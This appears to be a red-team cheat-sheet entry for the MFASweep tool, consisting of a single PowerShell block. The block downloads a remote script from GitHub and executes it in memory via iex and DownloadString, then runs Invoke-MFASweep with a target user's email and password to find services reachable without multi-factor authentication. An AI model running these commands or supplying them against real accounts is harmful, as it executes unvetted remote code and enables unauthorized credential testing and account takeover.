# [MFASweep](https://github.com/dafthack/MFASweep)
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(New-Object Net.WebClient).DownloadString('https://github.com/dafthack/MFASweep/blob/master/MFASweep.ps1?raw=true')
Invoke-MFASweep -Username <targetuser@targetdomain.com> -Password <password> -Recon -IncludeADFS
```
